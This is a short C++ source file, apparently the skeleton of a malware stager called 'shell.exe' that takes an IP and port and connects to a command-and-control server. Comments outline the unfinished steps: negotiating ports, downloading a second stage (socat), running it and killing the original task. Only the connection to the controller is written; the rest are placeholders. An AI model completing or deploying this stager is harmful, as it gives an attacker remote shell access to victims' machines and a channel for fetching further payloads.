
#include <iostream>
#include "connector.h"


int main(int argc, char** argv){

    if(argc!=3){
        std::cout << "shell.exe <ip> <port>\n";
        exit(1);
    }

    //connect to cc
    Connector c(argv[1], std::stoi(argv[2]));

    //negotiate ports


    //download second stage (socat)


    //run socat and kill this task


    return 0;
}